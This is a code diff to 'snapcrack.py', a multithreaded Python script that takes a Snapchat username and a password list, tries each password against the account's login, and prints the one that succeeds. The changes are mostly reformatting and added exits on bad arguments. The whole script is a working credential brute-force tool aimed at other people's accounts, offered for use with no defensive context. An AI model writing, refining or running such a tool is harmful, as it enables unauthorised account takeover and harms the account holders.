@@ -15,14 +15,17 @@ try:
     targetusername = sys.argv[1]
 except:
     print(" [ ! | SYNTAX ERROR ] $ python3 snapcrack.py < username > < /path/to/passlist.txt > < # Threads > ")
+    sys.exit(1)
 try:
     targetpasslist = sys.argv[2]
 except:
     print(" [ ! | SYNTAX ERROR ] $ python3 snapcrack.py < username > < /path/to/passlist.txt > < # Threads > ")
+    sys.exit(1)
 try:
     tNumber = int(sys.argv[3])
 except:
     print(" [ ! | SYNTAX ERROR ] $ python3 snapcrack.py < username > < /path/to/passlist.txt > < # Threads > ")
+    sys.exit(1)
 
 
 os.system("clear")
@@ -46,54 +49,48 @@ proxy = ''
 s = Snapchat(proxy)
 
 
-
 def main(counter):
-	passwords = open(targetpasslist,"r")
+    passwords = open(targetpasslist, "r")
 
-	for targetpassword in passwords:
-		# if s.login(targetusername, targetpassword)[b'updates_response'].get('logged'):
-		can_login = s.login(targetusername, targetpassword)
-			
-		is_logged = can_login.find(b'logged')
-		if is_logged > 0:
-
-		# break
-			print("[ ✓ | SUCCESS ] USERNAME: " + targetusername + "\t PASSWORD: " + targetpassword)
-			break
-		else:
-			print(f"[ 𐄂 | FAIL ] {targetpassword} INVALID!")
+    for targetpassword in passwords:
+        can_login = s.login(targetusername, targetpassword)
+        is_logged = can_login.find(b'logged')
+        if is_logged > 0:
+            print("[ ✓ | SUCCESS ] USERNAME: " + targetusername + "\t PASSWORD: " + targetpassword)
+            break
+        else:
+            print(f"[ 𐄂 | FAIL ] {targetpassword} INVALID!")
 
 
 if __name__ == '__main__':
-#	main()
+    # Multi-Threading
+    class Thread(threading.Thread):
+        def __init__(self, counter):
+            threading.Thread.__init__(self)
+            self.counter = counter
 
-# Multi-Threading
-	class Thread(threading.Thread):
-	   def __init__(self, counter):
-	      threading.Thread.__init__(self)
-	      self.counter = counter
-	   def run(self):
-	      # Get lock to synchronize threads
-	      threadLock.acquire()
-	      main(counter)
-	      # Free lock to release next thread
-	      threadLock.release()
+        def run(self):
+            # Get lock to synchronize threads
+            threadLock.acquire()
+            main(counter)
+            # Free lock to release next thread
+            threadLock.release()
 
 
-	threadLock = threading.Lock()
-	threads = []
-	counter = 0
+    threadLock = threading.Lock()
+    threads = []
+    counter = 0
 
-	while counter < tNumber:
-		thread = Thread(counter)
-		thread.start()
-		threads.append(thread)
-		counter += 1
+    while counter < tNumber:
+        thread = Thread(counter)
+        thread.start()
+        threads.append(thread)
+        counter += 1
 
-	for t in threads:
-		t.join()
+    for t in threads:
+        t.join()
 
-# Login | Found
-print(" [ ✓ | PASSWORD FOUND ] Thank you for being a user of SnapCrack!\n\n" +
-	" [ ! | TAKE NOTE OF THE SUCCESSFUL ATTEMPT ] NO CURRENT LOGGING TO FILE !" + 
-	"    Press any key to exit!")
+    # Login | Found
+    print(" [ ✓ | PASSWORD FOUND ] Thank you for being a user of SnapCrack!\n\n" +
+          " [ ! | TAKE NOTE OF THE SUCCESSFUL ATTEMPT ] NO CURRENT LOGGING TO FILE !" +
+          "    Press any key to exit!")
